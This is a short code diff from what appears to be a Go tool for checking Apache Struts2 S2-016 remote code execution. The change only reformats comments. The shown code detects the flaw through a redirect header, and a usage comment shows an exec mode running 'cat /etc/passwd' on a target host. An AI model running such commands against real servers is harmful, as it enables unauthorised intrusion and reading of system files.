@@ -10,10 +10,10 @@ import (
 ST2SG.exe --url http://192.168.123.128:8080/S2-016/default.action --vn 16 --mode exec --cmd "cat /etc/passwd"
 */
 func Check(targetUrl string) {
-    //s016的目的url必须带action，比如：http://xxx.com/xxx.action
-    //respString := utils.GetFunc4Struts2(targetUrl,"",utils.POC_s016_check)
+    // s016的目的url必须带action，比如：http://xxx.com/xxx.action
+    // respString := utils.GetFunc4Struts2(targetUrl,"",utils.POC_s016_check)
     headerLocation := utils.Get302Location(targetUrl + utils.POC_s016_check)
-    //fmt.Println(headerLocation)
+    // fmt.Println(headerLocation)
     if utils.IfContainsStr(headerLocation, "6308") {
         color.Red("*Found Struts2-016！")
     } else {
